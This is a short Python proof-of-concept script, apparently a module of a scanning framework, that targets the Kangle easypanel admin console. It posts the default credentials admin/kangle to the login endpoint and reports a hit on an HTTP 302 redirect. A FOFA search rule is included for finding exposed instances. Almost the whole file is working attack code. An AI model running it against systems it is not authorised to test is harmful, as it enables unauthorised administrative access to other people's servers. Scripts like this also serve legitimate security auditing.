#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME = 'Kangle_Console_default_password'
AUTHOR = "RabbitMask"
REMARK = 'kangle Console default password'
FOFA_RULE = 'app="kangle-easypanel"'
######################################################

def poc(target):
    result={}
    headers = {
        "User-Agent": ua,
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        "username": "admin",
        "passwd": "kangle",
    }

    try:
        r = requests.post(target + "/admin/index.php?c=session&a=login", headers=headers, data=data, verify=False, timeout=5,allow_redirects=False)
        if r.status_code==302:
            result['target'] = target
            result['poc'] = NAME
            result['url'] = target+'/admin/index.php?c=session&a=login'
            result['username'] = 'admin'
            result['password'] = 'kangle'
            return result
    except:
        pass



if __name__ == '__main__':
    poc("http://127.0.0.1:3312")
